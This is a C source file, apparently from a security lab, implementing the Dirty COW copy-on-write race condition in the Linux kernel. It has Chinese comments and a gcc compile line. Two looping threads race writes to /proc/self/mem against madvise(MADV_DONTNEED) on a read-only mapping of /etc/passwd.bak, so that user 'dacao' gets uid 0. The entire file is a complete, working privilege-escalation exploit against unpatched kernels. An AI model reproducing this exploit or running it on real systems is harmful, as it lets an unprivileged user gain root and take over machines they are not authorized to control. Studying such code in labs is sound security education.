/**
 * 文件名: cow_attack.c
 * 编译： gcc -pthread -o cow_attack cow_attack.c
 * 描述： 
 * main thread: 将只读文件/etc/passwd.bak映射进入内存
 * write thread: 对该内存进行写操作，触发COW机制；复制--》页表修改--》写操作
 * madvise thread: 放弃复制的内存，修改页表指回原来只读文件对应的内存
 * 作用：将用户dacao的uid改成0(root)
*/

#include <stdio.h>
#include <sys/types.h>  
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <string.h>
#include <pthread.h>

struct file_info
{
    char *map; //文件映射到内存的起始位置
    off_t file_size;// 文件映射到内存的大小
};


void *writeThread(void *arg){
    char *position = arg;
    char *new_content = "dacao:x:0";

    /*对/etc/passwd.bak的内存，进行写入操作，出发COW*/
    int f = open("/proc/self/mem",O_RDWR);
    while (1){
        lseek(f,(__off_t)position,SEEK_SET);
        write(f,new_content,strlen(new_content));
    }
    
}


void *madviseThread(void *arg){
    struct file_info *pth2_arg = (struct file_info*)arg;
    while (1){
        madvise(pth2_arg->map,pth2_arg->file_size,MADV_DONTNEED);//丢弃新的内存位置，map指向原来位置
    }
    
}


int main(void){
    struct stat st;

    /*将/etc/passwd.bak映射进入内存*/
    int f = open("/etc/passwd.bak",O_RDONLY);
    fstat(f,&st);
    void *map = mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);

    //传递给线程的变量
    char *position = strstr(map,"dacao:x:1000");
    struct file_info pth2_arg;
    pth2_arg.file_size = st.st_size;
    pth2_arg.map = map;

    pthread_t pth1,pth2;
    pthread_create(&pth1,NULL,writeThread,position);
    pthread_create(&pth2,NULL,madviseThread,&pth2_arg);

    pthread_join(pth1,NULL);
    pthread_join(pth2,NULL);

    return 0;
}